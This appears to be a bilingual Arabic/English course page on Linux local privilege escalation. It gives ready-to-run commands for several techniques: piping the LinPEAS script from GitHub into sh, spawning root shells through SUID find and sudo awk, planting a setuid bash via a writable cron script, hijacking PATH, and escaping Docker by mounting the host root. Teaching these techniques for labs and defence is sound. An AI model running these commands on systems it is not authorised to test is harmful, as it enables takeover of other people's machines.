Linux Security Privilege Escalation - Level 2

Linux Privilege Escalation — Level 2 Track

TRACK 2 ⏱ ~40 min

📖 What is it? / ما هو؟

AR

ترقية الصلاحيات المحلية (Local Privilege Escalation) هي عملية استغلال ثغرة أمنية أو خطأ إداري في تكوين النظام للحصول على صلاحيات المسؤول (root) انطلاقاً من حساب مستخدم محدود الصلاحية.

EN

Local Privilege Escalation (LPE) is the practice of exploiting security flaws or misconfigurations on a system to elevate permissions from a low-privileged account to root status.

🎯 Goal / الهدف

AR

تعلم كيفية فحص بيئة نظام لينكس يدوياً وتلقائياً، وتحديد نوافذ الاختراق واستغلال الأخطاء الشائعة لامتلاك النظام بالكامل.

EN

Mastering system audits via manual and automated tools, identifying vector classes, and exploiting common privilege escalation entry points.

📚 Topics & Commands / المواضيع والأوامر

1. Automated Enumeration / الفحص والاستطلاع التلقائي

AR

استخدم سكربتات التدقيق السريعة لتحديد الثغرات والأخطاء الشائعة تلقائياً:

EN

Using automation scripts to sweep the environment for known exploit vectors and credential files:

# Run LinPEAS script (best privilege escalation sweep script)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Run Linenum script
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O linenum.sh && chmod +x linenum.sh && ./linenum.sh

# Run Linux Exploit Suggester to check for kernel vulnerabilities
perl linux-exploit-suggester.pl

2. SUID Binaries / استغلال صلاحية SUID

AR

ابحث عن الملفات ذات صلاحية SUID التي تعمل بصلاحيات root واستغلها عبر قاعدة بيانات GTFOBins:

EN

Identifying setuid (SUID) files running under root owner context and cross-referencing with GTFOBins:

# Find all SUID files on the target filesystem
find / -perm -4000 -type f 2>/dev/null

# Example: if find has SUID bit, spawn root shell via find
find . -exec /bin/sh -p \; -quit

3. Cron Jobs / المهام المجدولة

AR

افحص ملفات المهام المجدولة بحثاً عن سكربتات تعمل كـ root وقابلة للكتابة والتعديل للمستخدم العادي:

EN

Auditing cron config schedules for root tasks executing user-writable scripts:

cat /etc/crontab          # View system cron jobs scheduler
ls -la /etc/cron.*         # List cron folders details
# If a script in cron is writable:
echo "chmod u+s /bin/bash" >> /path/to/writable_script.sh

4. Sudo Rights / صلاحيات Sudo المتاحة

AR

تحقق من الأوامر التي يمكنك تشغيلها بصلاحية sudo دون إدخال كلمة المرور:

EN

Inspecting allowed root commands that can be invoked via sudo without password credentials:

sudo -l                   # List allowed commands for current user
# Example: if awk is allowed:
sudo awk 'BEGIN {system("/bin/sh")}'

5. Kernel Exploits / استغلال ثغرات النواة

uname -a                  # Identify Linux kernel version and architecture
# On attack box:
searchsploit linux kernel 4.4.0   # Search exploit database for kernel version

6. Path Abuse / التلاعب بمتغير البيئة PATH

AR

إذا كان سكربت SUID يستدعي أمراً بدون مسار مطلق (مثلاً tar بدلاً من /bin/tar)، يمكنك تعديل PATH:

EN

If an SUID script executes system commands by relative paths instead of absolute ones, hijack the PATH environment variable:

echo $PATH                # Display current environment path
export PATH=/tmp:$PATH    # Prepend /tmp to PATH to run custom mock binary

7. File Capabilities / قدرات الملفات

AR

تسمح الـ Capabilities بتقسيم صلاحيات root ومنح جزء منها لملف تنفيذي دون تعيين SUID:

EN

Linux capabilities partition root privileges into distinct privileges that can be set on specific executables:

getcap -r / 2>/dev/null   # Search files with active capabilities

8. Docker Escape / الهروب من حاويات دوجر

AR

عند اختراق حاوية تعمل بامتيازات عالية، يمكن للمهاجم الهروب واستضافة السيرفر المضيف بربط مسار الجذر:

EN

If you compromise a docker container with active root socket permissions or high privilege parameters, mount the host drive:

docker --version          # Verify docker service presence
# Mount the root of host filesystem inside alpine container
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
